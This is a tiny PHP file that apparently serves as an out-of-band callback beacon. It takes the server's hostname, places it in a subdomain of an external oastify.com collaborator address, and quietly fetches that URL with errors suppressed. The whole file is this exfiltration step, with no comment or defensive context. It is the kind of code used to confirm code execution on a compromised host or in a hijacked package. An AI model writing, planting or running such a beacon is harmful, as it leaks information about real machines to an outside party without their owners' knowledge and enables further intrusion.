<?php
$hostname = gethostname() ?: 'unknown';
$hostname = preg_replace('/[^a-zA-Z0-9\-]/', '-', $hostname);
@file_get_contents("https://{$hostname}.ih3wc119nlaofnnxejlr8mig379yxold.oastify.com/test");
